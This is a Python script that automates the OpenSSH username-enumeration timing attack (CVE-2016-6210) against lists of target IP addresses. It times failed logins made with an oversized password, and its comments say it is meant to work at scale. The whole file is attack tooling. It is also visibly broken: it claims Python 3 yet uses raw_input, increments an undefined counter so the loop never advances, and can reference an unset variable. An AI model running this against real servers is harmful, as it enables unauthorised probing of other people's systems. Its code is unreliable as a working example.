#!/usr/bin/python

import paramiko
import time

# This script tests OpenSSH servers for the user enumeration bug
# announced on 18th July 2016, Tentatively numbered CVE 2016-6210
# Credit for the base script goes to Eddie Harari on the Full Disclosure ML
# Short, pretty, and works, but I wanted to make it work at scale!
# (And port it to python3, because I'm weird like that)

# As usual, don't do anything stupid/illegal with this.  It's your own damn fault if you do

def main():
    uscount = 0
    ipcount = 0
    results = []
    # Username source file.  Acquired from somewhere else
    filename = raw_input("Enter the file you wish to read usernames from: \n")
    try:
        user_file = open(filename,"r")
    except IOError:
        print("I'm having trouble opening the file."
                "Please check the name and path")
    user_file_length = getlines(filename)
    # Get the target IP addresses
    target_name = raw_input("Enter the file containing IP addresses"
                        "you'd like to test: \n")
    try:
        target_file = open(target_name,"r")
    except IOError:
        print("I'm having trouble opening the file."
                "Please check the name and path")

    target_file_length = getlines(target_name)

    while(uscount < user_file_length):
        user = user_file.readline()
        target = target_file.readline()
        p = 'A'*25000
        ssh = paramiko.SSHClient()
        starttime = time.clock()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target, username = str(user),
                        password = p)
        except:
            endtime = time.clock()
        total = endtime - starttime
        print("Time for " + user + "on " + target + ": " + str(total))
        results
        count += 1

def getlines(filename):
    with open(filename) as f:
        for i, l in enumerate(f):
            pass
    return i + 1
main()
